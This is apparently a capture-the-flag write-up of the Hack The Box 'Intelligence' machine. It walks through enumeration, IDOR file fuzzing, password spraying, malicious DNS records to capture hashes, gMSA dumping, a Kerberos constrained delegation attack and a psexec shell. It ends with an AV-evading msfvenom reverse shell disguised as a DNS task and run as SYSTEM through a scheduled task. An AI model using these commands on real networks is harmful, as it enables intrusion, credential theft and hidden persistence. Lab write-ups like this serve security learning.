DNS:dc.intelligence.htb | Not valid before: 2021-04-19T00:43:16 |_Not valid after: 2022-04-19T00:43:16 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=dc.intelligence.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:dc.intelligence.htb | Not valid before: 2021-04-19T00:43:16 |_Not valid after: 2022-04-19T00:43:16 |_ssl-date: 2024-09-27T22:32:27+00:00; +7h00m00s from scanner time. 9389/tcp open mc-nmf .NET Message Framing 49667/tcp open msrpc Microsoft Windows RPC 49691/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49692/tcp open msrpc Microsoft Windows RPC 49710/tcp open msrpc Microsoft Windows RPC 49713/tcp open msrpc Microsoft Windows RPC 49737/tcp open msrpc Microsoft Windows RPC Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running (JUST GUESSING): Microsoft Windows 2019 (89%) Aggressive OS guesses: Microsoft Windows Server 2019 (89%) No exact OS matches for host (test conditions non-ideal). Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required | smb2-time: | date: 2024-09-27T22:31:48 |_ start_date: N/A OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 255.43 seconds Discoveries:\nDNS 53: As this is a Domain Controller it is running the DNS service. I run dnsenum to enumerate the DNS service: dnsenum -r --dnsserver $box --enum -p 0 -s 0 -f ~/Seclists/Discovery/DNS/subdomains-top1million-110000.txt intelligence.htb It is just the standard entries for any AD Domain. LDAP 389: Using LDAP anonymous bind to enumerate further:\nIf you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials. We can actually retrieve a significant amount of information via anonymous bind such as: A list of all users A list of all groups A list of all computers. User account attributes. The domain password policy. Enumerate users who are susceptible to AS-REPRoasting. Passwords stored in the description fields The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates. I actually have a handy script to check if anonymous bind is enabled \u0026amp; if it is to dump a large amount of information. You can find it here\nhttps://github.com/bloodstiller/ldapchecker It turns out the anonymous bind is enabled and we get the below information. I have removed the majority of the information as it is not relevant, however there are some keys bits of information we can use moving forward.\nWe have the naming context of the domain:\nkali in ~/Desktop/WindowsTools 🐍 v3.11.9 4GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 17:36:54 zsh ❯ python3 ldapchecker.py $box Attempting to connect to 10.129.95.154 with SSL... Connected successfully. Retrieving server information... DSA info (from DSE): Supported LDAP versions: 3, 2 Naming contexts: DC=intelligence,DC=htb CN=Configuration,DC=intelligence,DC=htb CN=Schema,CN=Configuration,DC=intelligence,DC=htb DC=DomainDnsZones,DC=intelligence,DC=htb DC=ForestDnsZones,DC=intelligence,DC=htb We have the domain functionaility level:\nOther: domainFunctionality: 7 forestFunctionality: 7 domainControllerFunctionality: 7 rootDomainNamingContext: DC=intelligence,DC=htb ldapServiceName: intelligence.htb:dc$@INTELLIGENCE.HTB The functionality level determines the minimum version of Windows server that can be used for a DC. +Note+: Any host os can be used on workstations, however the functionality level determines what the minimum version for DC\u0026rsquo;s and the forest.\nhttps://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels Knowing the function level is useful as if want to target the DC\u0026rsquo;s and servers, we can know by looking at the function level what the minimum level of OS would be.\nIn this case we can see it is level 7 which means that this server has to be running Windows Server 2016 or newer.\nHere\u0026rsquo;s a list of functional level numbers and their corresponding Windows Server operating systems:\nFunctional Level Number Corresponding OS 0 Windows 2000 1 Windows Server 2003 Interim 2 Windows Server 2003 3 Windows Server 2008 4 Windows Server 2008 R2 5 Windows Server 2012 6 Windows Server 2012 R2 7 Windows Server 2016 8 Windows Server 2019 9 Windows Server 2022 +Note+: Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest. As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers. We have the full server name:\nAgain we can see this has the CN as the base (mentioned previously.) serverName: CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=intelligence,DC=htb It\u0026rsquo;s pretty amazing already what we have learned just by running some fairly simple ldap queries.\nWe have the naming context. Domain name. SMB 445: I check if we can use a null session or guest session to connect to the SMB Share: HTTP 80: It\u0026rsquo;s running a mostly unfinished website.\nInspecting the website I the links for two documents \u0026amp; they have a similar naming structure YYYY-DD-MM-upload.pdf \u0026amp; are stored in the documents folder, this naming structure can easily be fuzzed using FFUF.\nI do some dirbusting with feroxbuster and can see that there are multiple other entries in the documents folder:\nferoxbuster -u http://$box Fuzzing for Uploads using FFUF (Finding IDORs): Creating a Simple Wordlist:\nAll of seclists are very long so I make a new list from 0-32 using a simple python terminal \u0026amp; save that to my personal wordlists list: +Note+: It\u0026rsquo;s really important we put the leading zero\u0026rsquo;s by utilizing format string literals as otherwise number\u0026rsquo;s 1-9 will miss the leading zeros and as we can see this format is utilizing 2 digits to represent the month \u0026amp; day so we would miss potential entries. Running FFUF:\nffuf -w ~/Wordlists/45.06-CustomWordlists/numbersDays-1-31.txt:FIRST -w ~/Wordlists/45.06-CustomWordlists/numbersDays-1-31.txt:SECOND -u http://10.129.95.154/Documents/2020-FIRST-SECOND-upload.pdf I get ALOT of hits. To make things easier I am going to script a way to easily download all of these files. Explanation of Vulnerability Indirect Object Reference (IDOR): This type of vulnerability is called an Indirect Object Reference or (IDOR)\nIt is a security flaw where an application exposes a reference to an internal implementation object, such as a file, directory, or database key, without proper authorization checks.\nCommon Examples:\nExposed database record IDs in URLs or form fields that can be manipulated to access other users\u0026rsquo; data. Direct references to files or directories in the web server that can be accessed or downloaded without proper authentication. This is what we took advantage of, just by seeing that there were two PDF\u0026rsquo;s with the same naming structure of YYYY-MM-DD-upload.pdf we were able to fuzz the website and find other files that we should not be able to access and access them. Prevention Methods:\nImplementing proper access control checks to ensure users can only access objects they are authorized to. Avoiding the use of direct object references in user-accessible inputs whenever possible. Using indirect reference maps or tokens to reference internal objects. Further reading on IDORs:\nHow to find IDORs: https://vickieli.medium.com/how-to-find-more-idors-ae2db67c9489 OWASP: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References Scripting a simple mass down-loader to download the PDF\u0026rsquo;s: Here is my script for mass downloading the files from site. It\u0026rsquo;s simple in that it essentially fuzzes for every day \u0026amp; month combination \u0026amp; depending on the HTTP response will download the file or print a message saying file not found. import requests # Days from 01 to 31 days = [str(day).zfill(2) for day in range(1, 32)] # Months from 01 to 12 months = [str(month).zfill(2) for month in range(1, 13)] # Loop through days and months for d in days: for m in months: # Construct the URL: url = f\u0026#34;http://10.129.95.154/Documents/2020-{m}-{d}-upload.pdf\u0026#34; response = requests.get(url) # Check if the request was successful: if response.status_code == 200: print(f\u0026#34;Downloading {url}\u0026#34;) # Save the file locally \u0026amp; print message: file_name = f\u0026#34;2020-{m}-{d}-upload.pdf\u0026#34; with open(file_name, \u0026#39;wb\u0026#39;) as file: file.write(response.content) # If we get a 404 response print that no file was found: elif response.status_code == 404: print(f\u0026#34;No file found at {url}\u0026#34;) Converting the PDF\u0026rsquo;s to text using pdftotext for easier processing: Looking at the results I can see that there is 86 files in there, which is ALOT to manually go through.\nInstall poppler-utils:\nsudo apt-get install poppler-utils Convert the files:\nfor p in *pdf; do pdftotext $p; done This is a simple for loop that iterates through the list of pdfs in the folder and runs pdftotext on them to convert them. Finding a default password \u0026amp; a username in a pdf: After going through the converted pdf\u0026rsquo;s I find a clear-text password And a username from an IT user called \u0026ldquo;Ted\u0026rdquo;: Unfortunately this is not a valid username in AD it should be first.lastname for SAM Accounts. Extracting Usernames from the creator field of the PDF\u0026rsquo;s: PDF Metadata Collection:\nWhen creating a PDF, many programs (e.g., Microsoft Word, Adobe Acrobat) automatically pull metadata from the system. System Environment Variables:\nThe logged-in Windows username is part of system environment variables. This is often used to populate fields like \u0026ldquo;Creator\u0026rdquo; in the PDF document. Program Defaults:\nBy default, many PDF generation tools use the logged-in username as the creator unless manually changed by the user. Tracking Ownership:\nThis feature helps track the original creator or author of a document for auditing or document management purposes. Reading the data:\nWe can read the data using the tool exiftool I believe it is installed by default in kali It also means we can extract valid SAM account names from the PDFs! Command to extract usernames from pdf metadata \u0026amp; save to a list:\nexiftool -Creator -csv *pdf | cut -d, -f2 | sort | uniq \u0026gt; userNames.txt Looking at our results we can see we have valid SAM names \u0026amp; a total user count of 31 users that we have extracted. Command Breakdown exiftool -Creator -csv *pdf\nexiftool: Run the tool -Creator: Extracts the Creator metadata field from the files. -csv: Outputs the data in CSV format. This is the most important part for the rest of the command to work: The CSV format provides a structured way to output the metadata in rows and columns. When extracting metadata from multiple PDFs, each PDF\u0026rsquo;s metadata is presented as a row, and each field (like \u0026ldquo;Creator\u0026rdquo;) is a column. This makes it easier to process the data programmatically. Simplicity: When using tools like cut, it\u0026rsquo;s easier to extract specific fields by referring to column numbers (e.g., -f2 for the second column), which is straightforward with CSV formatting. *pdf: Targets all PDF files in the current directory. | cut -d, -f2\n|: Pipes the output from the previous command into the next. cut: Extracts specific fields from the CSV output. -d,: Uses a comma as the delimiter (since it\u0026rsquo;s CSV data). -f2: Selects the second field, which contains the creator name. | sort: Sorts the creator names alphabetically.\n| uniq: Removes duplicate names, leaving only unique entries.\n\u0026gt; userNames.txt\nRedirects the final output (unique creator names) into a file named userNames.txt 2. Foothold: Credential Stuffing with netexec: Credential Stuffing: netexec smb $box -u userList.txt -p $pass --shares --continue-on-success | grep [+] We get a hit: We can see she has access to some interesting shares, namely IT, Users \u0026amp; Sysvol. Credentialed SMB Enumeration: Enumerating Users Share: Connecting to the users share I find it is as it says a list of user directories: I get the user.txt flag: I check the SYSVOL share but there is nothing of note there. I also asreproasted \u0026amp; kerberoasted using netexec, nothing of note. I checked the NETLOGON share. I also tried secrets-dump (sometimes great to do with a low-priv account as you never know what you will get) Finding a user script: I connect to the IT share and find a file called downdetector.ps1 Looking at the script it checks if any hosts with a DNS name that starts with web are down every 5 minutes and then emails Ted.Graves. What using is particularly interesting about this though is that it sends a Credentialed Request using the user Ted.Graves -UseDefaultCredentials to each of the entries; meaning if we can get it to try to authenticate to us by adding a fake DNS entry we can potentially grab Ted.Graves credentials!!! As he is receiving these emails we can safely assume he is either part of IT or networking (plus this is probably the script that was referenced in the PDF\u0026rsquo;s we pulled). 3. Lateral Movement \u0026amp; Privilege Escalation: Adding a Malicious DNS Entry using dnstool.py: We can use the tool dnstool which is part of krbrelayx .\nThis tool enables us to \u0026ldquo;Add/modify/delete Active Directory Integrated DNS records via LDAP.\u0026rdquo; Clone The Repo:\ngit clone https://github.com/dirkjanm/krbrelayx.git /opt/krbrelayx I start responder :\nsudo responder -v -I tun0 I make dns entry:\npython3 dnstool.py $box -u intelligence\\\\$user -p $pass --action add --record web-bloodstiller --data $myip --type A +Note+: It requires the hostname/ip as an argument but there is no flag for it, it just accepts it. We capture a hash for ted.graves:\nWhy can we just add malicious DNS entries to a Domain Controller?: So I had to go searching for this information as I was not sure if this vulnerability was the result of our user Tiffany.Molina having this privilege. There is no evidence she is part of any DNS administration groups: I read some sources saying that by default any authenticated user can add DNS entries in an AD environment. ippsec also states this here Whereas Kevin Robertson (creator of PowerMad \u0026amp; Inveigh ) states:\nModifying ADIDNS Zones There are two primary methods of remotely modifying an ADIDNS zone. The first involves using the RPC based management tools. These tools generally require a DNS administrator or above so I won\u0026rsquo;t bother describing their capabilities. The second method is DNS dynamic updates. Dynamic updates is a DNS specific protocol designed for modifying DNS zones. Within the AD world, dynamic updates is primarily leveraged by machine accounts to add and update their own DNS records.\nSource: https://www.netspi.com/blog/technical-blog/network-penetration-testing/exploiting-adidns/ Cracking Teds Hash using Hashcat: I use hashcat to cracks Ted\u0026rsquo;s password: hashcat -m 5600 ted.hash ~/Wordlists/rockyou.txt Running Bloodhound as Ted Graves: As we have Ted\u0026rsquo;s creds we can run the python collector for bloodhound. python3 bloodhound.py -dc dc.intelligence.htb -c All -u $user -p $pass -d intelligence.htb -ns $box We can see that Ted part of the ITSUPPORT group and this group has the ability to read the GMSAPassword of the host SVC_INT$: Looking further we can see that the host SVC_INT$ has the constrained delegation privilege over the Domain Controller DC.INTELLIGENCE.HTB this gives us a clear attack path as we can perform a constrained delegation attack. Using gMSADumper.py to dump the gMSA Password: I dump the gMSA Password using gMSADumper.py python3 gMSADumper.py -u $user -p $pass -d intelligence.htb The first line is the NTLM hash of the SVC_INT$ machine account. I verify the hash is valid using netexec:\nnetexec smb $box -u svc_int$ -H $hash --shares What is gMSA \u0026amp; gMSA Password?: gMSA (Group Managed Service Account):\nA gMSA is a type of service account in Active Directory that is designed to enhance security and reduce administrative overhead for service accounts. They provide automatic password management \u0026amp; simplified service principal name (SPN) management. The password for a gMSAccount is a gMSA password:\nThey are automatically generated by Active Directory \u0026amp; 240 characters long !!! So not even worth trying to crack They are automatically rotated regularly: (default is 30 days) They are not known or accessible to administrators. Some further points about gMSA passwords:\nThey eliminate the need for manual password resets as they are handled by the system. The password is managed by the domain controllers Authorized hosts can retrieve the current password when needed This approach significantly reduces the risk of password-related security issues 4. Ownership: 1. Clock Synchronization To Ensure Kerberos Tickets Are Valid: Sync The Clock of our Attack Host with the Target:\nI sync my clock with the host, this is crucially important as Kerberos has time based checks when authorizing we need to ensure our times our synced with our target. The error you will see if your clock is not synced: If you are on kali do the following:\nsudo apt install ntpdate Ensure that you have the host in your /etc/hosts file \u0026amp; then run: sudo ntpdate -s intelligence.htb this will sync your clocks. 2. Kerberos Constrained Delegation (KCD) Attack: I launch the constrained delegation attack: impacket-getST -spn WWW/dc.intelligence.htb 'INTELLIGENCE.HTB/svc_int' -impersonate Administrator -dc-ip $box -hashes :$hash Despite getting a lot of errors I still get a .cacche file. Constrained Delegation KCD Attack Explained: Compromise a Service Account:\nWe need to gain control of a service account that has been configured for constrained delegation. We have control over svc_int$ computer account Identify Delegation Targets:\nEnumerates the services which our compromised account is allowed to delegate to. We know we can delegate to WWW/dc.intelligence.htb which is a service running on the Domain Controller Request a TGT: Handled by impacket-getST\nWe requests a Ticket Granting Ticket (TGT) for the compromised service account. Request a Service Ticket: impacket-getST\nUsing the TGT, the we requests a service ticket for one of the allowed delegation targets. We specify the user they want to impersonate in this case it will be the Administrator account. S4U2Self: impacket-getST\nThe Key Distribution Center (KDC) performs an S4U2Self (Service for User to Self) operation. This creates a service ticket as if the impersonated user (Administrator) had requested it. S4U2Proxy: impacket-getST\nThe KDC then performs an S4U2Proxy (Service for User to Proxy) operation. This allows the service ticket to be used for delegation to the target service. Access Target Service:\nWe can now use this ticket to access the target service, appearing as the impersonated user. 3. Load the .ccache into memory with the KRB5CCNAME variable: First I rename the .ccache:\n+Note+: The only reason I do this is because it\u0026rsquo;s neater visually, there is no other reason to do this other than personal preference, that is all. Load the .ccache into the KRB5CCNAME variable:\nThe KRB5CCNAME environment is variable used by Kerberos 5 (KRB5) as a pointer to the .cacche which actually stores the creds. 4. Getting a shell using impacket-psexec: As we have the KRB5CCNAME variable pointing at our .ccache file we can use kerberos authentication get a shell:\nimpacket-psexec intelligence.htb/administrator@dc.intelligence.htb -k -no-pass -dc-ip $box -target-ip $box Root flag obtained:\n5. Ownership: Dumping NTDS using netexec and our kerberos credentials: As netexec also allows kerberos authentication we can dump the NTDS database to extract all the hashes from the DC.\nI verify the Administrators hash works by creating starting a session using evil-winrm:\nevil-winrm -i $box -u administrator -H $hash 6. Persistence: Creating a windows scheduled task to enable a backdoor. I understand this is a box but I want to demonstrate how we can achieve persistence:\nI create an obfuscated shell using msfvenom:\nmsfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.19 LPORT=53 -a x86 --platform windows -e x86/shikata_ga_nai -i 100 -f raw | msfvenom -a x86 --platform windows -e x86/countdown -i 200 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -f exe -o dnsTask.exe I use port 53 \u0026amp; call it dnsTask.exe as a way to make it appear like a normal DNS task connecting to a DNS server. I upload this to the target via evil-winrm to C:\\Windows:\nI upload it to the C:\\Windows folder as a further way to make it look authentic. I create a scheduled task to execute my shell every 1 minute:\nschtasks /create /sc minute /mo 1 /tn \u0026quot;dnsTask\u0026quot; /tr C:\\Windows\\dnsTask.exe /ru \u0026quot;SYSTEM\u0026quot; Command Breakdown: schtasks: The command-line utility in Windows used to create, delete, configure, or display scheduled tasks. /create: This option tells schtasks to create a new scheduled task. /sc minute: This specifies the schedule frequency for the task. In this case, it will run every minute. /mo 1: Modifies the frequency (modifier) to occur every 1 minute. /tn \u0026quot;dns\u0026quot;: The task\u0026rsquo;s name is \u0026ldquo;dnsTask\u0026rdquo;. /tr C:\\dnsTask.exe: The task will run the script or command C:\\tools\\shell.cmd. /ru \u0026quot;SYSTEM\u0026quot;: This specifies that the task will run under the SYSTEM\u0026quot;~ user account, which gives it high-level privileges. I start my listener in nc.exe\nnc -nvlp 53 And…..nothing, I believe my shell is being caught by defender. I will need to find another way, but that can wait for another day. Lessons Learned: What did I learn? I learned that users may or may not be able to add DNS entries (super clear I know.) I never had considered using DNS as a means to for spoofing before which was a cool thing to do. What silly mistakes did I make? I didn\u0026rsquo;t specify the SPN the first time when running the KCD attack. I ran bloodhound a little too late. This was mainly due to having issues with bloodhound.py but after setting it up in a venv it was fine. Sign off: Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!\nUntil next time, hack the planet!\n– Bloodstiller\n– Get in touch bloodstiller at proton dot me\n",
